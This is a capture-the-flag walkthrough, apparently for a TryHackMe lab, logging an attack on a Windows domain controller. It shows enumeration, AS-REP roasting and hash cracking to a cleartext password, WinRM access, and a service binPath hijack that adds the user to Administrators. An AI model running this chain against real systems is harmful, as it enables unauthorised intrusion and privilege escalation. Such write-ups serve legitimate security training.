@@ -1,0 +1,586 @@
+## TCP-scan
+```
+# Nmap 7.95 scan initiated Thu Apr 17 22:22:53 2025 as: /usr/lib/nmap/nmap -sC -sV -p- -T4 -vv -oA tcpscan-services-thm services.thm
+..snipped..
+Nmap scan report for services.thm (10.10.157.183)
+Host is up, received echo-reply ttl 127 (0.17s latency).
+Scanned at 2025-04-17 22:22:53 +08 for 793s
+Not shown: 65506 closed tcp ports (reset)
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Above Services
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-17 14:35:00Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+|_ssl-date: 2025-04-17T14:36:01+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
+| Issuer: commonName=WIN-SERVICES.services.local
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-16T14:11:40
+| Not valid after:  2025-10-16T14:11:40
+| MD5:   bc71:d418:5172:eb60:ad47:3363:3d9c:da7f
+| SHA-1: 41e7:23fc:21d2:1d98:7e22:5daa:7b9c:4836:12e7:be85
+| -----BEGIN CERTIFICATE-----
+..snipped..
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: SERVICES
+|   NetBIOS_Domain_Name: SERVICES
+|   NetBIOS_Computer_Name: WIN-SERVICES
+|   DNS_Domain_Name: services.local
+|   DNS_Computer_Name: WIN-SERVICES.services.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-04-17T14:35:51+00:00
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49699/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49702/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-04-17T14:35:53
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 22468/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 50129/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 43398/udp): CLEAN (Timeout)
+|   Check 4 (port 56926/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Apr 17 22:36:06 2025 -- 1 IP address (1 host up) scanned in 793.39 seconds
+```
+
+
+## UDP-scan
+```
+# Nmap 7.95 scan initiated Thu Apr 17 22:15:00 2025 as: /usr/lib/nmap/nmap -sU -vv -oA udpscan-services-thm services.thm
+Increasing send delay for 10.10.157.183 from 100 to 200 due to 11 out of 11 dropped probes since last increase.
+Nmap scan report for services.thm (10.10.157.183)
+Host is up, received echo-reply ttl 127 (0.17s latency).
+Scanned at 2025-04-17 22:15:00 +08 for 1250s
+Not shown: 972 closed udp ports (port-unreach)
+PORT      STATE         SERVICE       REASON
+53/udp    open          domain        udp-response ttl 127
+88/udp    open          kerberos-sec  udp-response ttl 127
+123/udp   open          ntp           udp-response ttl 127
+137/udp   open|filtered netbios-ns    no-response
+138/udp   open|filtered netbios-dgm   no-response
+389/udp   open          ldap          udp-response ttl 127
+464/udp   open|filtered kpasswd5      no-response
+500/udp   open|filtered isakmp        no-response
+3389/udp  open|filtered ms-wbt-server no-response
+4500/udp  open|filtered nat-t-ike     no-response
+5353/udp  open|filtered zeroconf      no-response
+5355/udp  open|filtered llmnr         no-response
+61319/udp open|filtered unknown       no-response
+61322/udp open|filtered unknown       no-response
+61370/udp open|filtered unknown       no-response
+61412/udp open|filtered unknown       no-response
+61481/udp open|filtered unknown       no-response
+61550/udp open|filtered unknown       no-response
+61685/udp open|filtered unknown       no-response
+61961/udp open|filtered unknown       no-response
+62154/udp open|filtered unknown       no-response
+62287/udp open|filtered unknown       no-response
+62575/udp open|filtered unknown       no-response
+62677/udp open|filtered unknown       no-response
+62699/udp open|filtered unknown       no-response
+62958/udp open|filtered unknown       no-response
+63420/udp open|filtered unknown       no-response
+63555/udp open|filtered unknown       no-response
+
+Read data files from: /usr/share/nmap
+# Nmap done at Thu Apr 17 22:35:50 2025 -- 1 IP address (1 host up) scanned in 1250.64 seconds
+```
+
+
+## On the website
+```
+Our Contact
+Above Services Inc
+JC Main Road, Near Silnile tower
+Pin-21542 NewYork US.
+(123) 456-789 - 1255-12584
+j.doe@services.local
+```
+
+
+## On the website too 
+```
+http://services.thm/about.html
+Joanne Doe
+Jack Rock
+Will Masters
+Johnny LaRusso
+```
+
+
+## Subdomain fuzz - Nothing
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ ffuf -w ./subdomains-top1million-110000.txt -u http://services.local -H "Host:FUZZ.services.local" -fw 2794
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://services.local
+ :: Wordlist         : FUZZ: /home/kali/thm/service/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.services.local
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 2794
+________________________________________________
+
+:: Progress: [114441/114441] :: Job [1/1] :: 242 req/sec :: Duration: [0:08:40] :: Errors: 0 ::
+```
+
+
+## Gobuster - dir scan - nothing 
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ gobuster dir -u http://services.thm -w ./raft-medium-directories.txt -o services-raft-dir.out                               
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://services.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                ./raft-medium-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/js                   (Status: 301) [Size: 146] [--> http://services.thm/js/]
+/css                  (Status: 301) [Size: 147] [--> http://services.thm/css/]
+/img                  (Status: 301) [Size: 147] [--> http://services.thm/img/]
+/fonts                (Status: 301) [Size: 149] [--> http://services.thm/fonts/]
+/CSS                  (Status: 301) [Size: 147] [--> http://services.thm/CSS/]
+/JS                   (Status: 301) [Size: 146] [--> http://services.thm/JS/]
+/Js                   (Status: 301) [Size: 146] [--> http://services.thm/Js/]
+/Css                  (Status: 301) [Size: 147] [--> http://services.thm/Css/]
+/IMG                  (Status: 301) [Size: 147] [--> http://services.thm/IMG/]
+/Img                  (Status: 301) [Size: 147] [--> http://services.thm/Img/]
+/Fonts                (Status: 301) [Size: 149] [--> http://services.thm/Fonts/]
+```
+
+
+## Gobuster file scan - nothing 
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ gobuster dir -u http://services.thm -w ./raft-medium-files.txt services-raft-files.out                                      
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://services.thm
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                ./raft-medium-files.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 13960]
+/contact.html         (Status: 200) [Size: 9279]
+/.                    (Status: 200) [Size: 13960]
+/about.html           (Status: 200) [Size: 14875]
+/Contact.html         (Status: 200) [Size: 9279]
+/portfolio.html       (Status: 200) [Size: 10582]
+/pricing.html         (Status: 200) [Size: 8565]
+/Index.html           (Status: 200) [Size: 13960]
+/courses.html         (Status: 200) [Size: 9810]
+/About.html           (Status: 200) [Size: 14875]
+/Portfolio.html       (Status: 200) [Size: 10582]
+Progress: 17129 / 17130 (99.99%)
+===============================================================
+Finished
+===============================================================
+```
+
+
+## SMB share enumeration - nothing 
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ smbclient -L //services.local -N
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to services.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+```
+
+
+## Enumeration via RPC - not successful 
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ rpcclient -U "" services.local -N
+rpcclient $> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> getusername
+Account Name: ANONYMOUS LOGON, Authority Name: NT AUTHORITY
+rpcclient $> srvinfo
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+rpcclient $> netshareenumall
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+rpcclient $> lookupnames j.doe
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> enumdomgroups
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> 
+```
+
+
+## ldapsearch - nothing
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ ldapsearch -x -H ldap://10.10.157.183 -b "dc=services,dc=local"
+# extended LDIF
+#
+# LDAPv3
+# base <dc=services,dc=local> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5E, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+```
+
+
+## kerbrute 
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ ./kerbrute userenum -d services.local ./users.txt --dc 10.10.157.183 | tee services-users.out 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 04/17/25 - Ronnie Flathers @ropnop
+
+2025/04/17 23:31:23 >  Using KDC(s):
+2025/04/17 23:31:23 >   10.10.157.183:88
+
+2025/04/17 23:31:23 >  [+] VALID USERNAME:       j.doe@services.local
+2025/04/17 23:31:23 >  [+] VALID USERNAME:       j.larusso@services.local
+2025/04/17 23:31:23 >  [+] VALID USERNAME:       administrator@services.local
+2025/04/17 23:31:23 >  [+] VALID USERNAME:       w.masters@services.local
+2025/04/17 23:31:24 >  [+] VALID USERNAME:       j.rock@services.local
+2025/04/17 23:31:24 >  Done! Tested 5 usernames (5 valid) in 0.518 seconds
+```
+
+
+## asrep roasting - nothing
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ impacket-GetNPUsers services.local/ -no-pass -usersfile users.txt -dc-ip 10.10.157.183 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+[-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$j.rock@SERVICES.LOCAL:0421c427ad8f5a7a52bdef6a77046dc0$59fc6dd80730ab45952ae69db932dca31de3ac25bdaa59d3e39c39c9ecbd268f2a3b84abdabdbd741686415b5290f090fda2e2e86d62193cec31b2877ffe1acea56b74a0d4b4d7e6d4d04acfe2d3ee3992146d807fb123e27eadb0a0a954e6f433dbd9548d5f059b2c1a608c08c12f26100c954763c1515b8ed003528a7104a904244fd9fc8a2984c28f59ee28bfbe1572457db3d3a96bf79eaef775f6fd253d5da176efd18c0c2f3c74ec2ac6a85e6c7e5141f9945939216865f1e16def5547423969f5337c46dec39483ffbb90b8a05b80d2dadfcfa16e43d66476c2ffc5a6423b63ca8a6cf6004fc7bd8b5fa8cdb7
+[-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+
+## Crack as-rep hash - via rockyou. Strange that kaonashi failed :/
+```
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$j.rock@SERVICES.LOCAL:0421c427ad8f5a7...a8cdb7
+Time.Started.....: Thu Apr 17 23:38:05 2025 (0 secs)
+Time.Estimated...: Thu Apr 17 23:38:05 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (./rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 16350.3 kH/s (8.45ms) @ Accel:512 Loops:1 Thr:32 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10747904/14344384 (74.93%)
+Rejected.........: 0/10747904 (0.00%)
+Restore.Point....: 10485760/14344384 (73.10%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: XiaoLing.1215 -> PINKPIGGY
+Hardware.Mon.SMC.: Fan0: 20%
+Hardware.Mon.#1..: Util: 66%
+
+Started: Thu Apr 17 23:38:04 2025
+Stopped: Thu Apr 17 23:38:06 2025
+evdaez@mac-mini-big hacking % hashcat -m 18200 asrep.hash ./rockyou.txt -o asrep.hash.cracked
+evdaez@mac-mini-big hacking % cat asrep.hash.cracked 
+$krb5asrep$23$j.rock@SERVICES.LOCAL:0421c427ad8f5a7a52bdef6a77046dc0$59fc6dd80730ab45952ae69db932dca31de3ac25bdaa59d3e39c39c9ecbd268f2a3b84abdabdbd741686415b5290f090fda2e2e86d62193cec31b2877ffe1acea56b74a0d4b4d7e6d4d04acfe2d3ee3992146d807fb123e27eadb0a0a954e6f433dbd9548d5f059b2c1a608c08c12f26100c954763c1515b8ed003528a7104a904244fd9fc8a2984c28f59ee28bfbe1572457db3d3a96bf79eaef775f6fd253d5da176efd18c0c2f3c74ec2ac6a85e6c7e5141f9945939216865f1e16def5547423969f5337c46dec39483ffbb90b8a05b80d2dadfcfa16e43d66476c2ffc5a6423b63ca8a6cf6004fc7bd8b5fa8cdb7:Serviceworks1
+```
+
+
+## Possible via winrm but not smb
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ nxc smb services.local -u j.rock -p Serviceworks1 -x whoami
+SMB         10.10.157.183   445    WIN-SERVICES     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-SERVICES) (domain:services.local) (signing:True) (SMBv1:False)
+SMB         10.10.157.183   445    WIN-SERVICES     [+] services.local\j.rock:Serviceworks1 
+                                                                                                                                                                                                   
+┌──(kali㉿kali)-[~/thm/service]
+└─$ nxc winrm services.local -u j.rock -p Serviceworks1 -x whoami
+WINRM       10.10.157.183   5985   WIN-SERVICES     [*] Windows 10 / Server 2019 Build 17763 (name:WIN-SERVICES) (domain:services.local)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.157.183   5985   WIN-SERVICES     [+] services.local\j.rock:Serviceworks1 (Pwn3d!)
+WINRM       10.10.157.183   5985   WIN-SERVICES     [-] Execute command failed, current user: 'services.local\j.rock' has no 'Invoke' rights to execute command (shell type: cmd)
+WINRM       10.10.157.183   5985   WIN-SERVICES     [+] Executed command (shell type: powershell)
+WINRM       10.10.157.183   5985   WIN-SERVICES     services\j.rock                                                                   
+```
+
+
+## Okay we are in 
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ evil-winrm -i services.local -u j.rock -p Serviceworks1 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\j.rock\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeSystemtimePrivilege         Change the system time              Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+```
+
+
+## Enumerate Privs 
+```
+*Evil-WinRM* PS C:\Users\j.rock\Desktop> net user j.rock /domain
+User name                    j.rock
+Full Name                    Jack Rock
+Comment                      IT Support
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/15/2023 5:42:32 AM
+Password expires             Never
+Password changeable          2/16/2023 5:42:32 AM
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   4/17/2025 3:33:08 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use*Server Operators
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+
+## Used this script to check writable services 
+```
+$basePath = "HKLM:\SYSTEM\CurrentControlSet\Services"
+$services = Get-ChildItem -Path $basePath
+
+foreach ($svc in $services) {
+    try {
+        $acl = Get-Acl -Path $svc.PSPath
+        foreach ($ace in $acl.Access) {
+            if (
+                ($ace.IdentityReference -like "$env:USERDOMAIN\$env:USERNAME" -or
+                 $ace.IdentityReference -like "*Server Operators*" -or
+                 $ace.IdentityReference -like "*Everyone*") -and
+                ($ace.RegistryRights -match "SetValue|FullControl|WriteKey")
+            ) {
+                Write-Host "[+] Writable Service Registry Key Found: $($svc.PSChildName)" -ForegroundColor Green
+                Write-Host "    Path : $($svc.PSPath)"
+                Write-Host "    ACL  : $($ace.IdentityReference) - $($ace.RegistryRights)"
+                Write-Host ""
+            }
+        }
+    } catch {
+        continue
+    }
+}
+```
+
+
+## Privilege escalation
+```
+*Evil-WinRM* PS C:\temp> cmd.exe /c 'sc.exe config ADWS binPath= "cmd.exe /c net localgroup administrators j.rock /add"'
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\temp> cmd.exe /c 'sc.exe start ADWS'
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+*Evil-WinRM* PS C:\temp> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Domain Admins
+Enterprise Admins
+j.rock
+The command completed successfully.
+
+*Evil-WinRM* PS C:\temp> net user j.rock /domain
+User name                    j.rock
+Full Name                    Jack Rock
+Comment                      IT Support
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/15/2023 5:42:32 AM
+Password expires             Never
+Password changeable          2/16/2023 5:42:32 AM
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   4/17/2025 3:33:08 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Server Operators
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+
+## Admin now 
+```
+┌──(kali㉿kali)-[~/thm/service]
+└─$ evil-winrm -i services.local -u j.rock -p Serviceworks1 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\j.rock\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\j.rock\Documents> 
+```
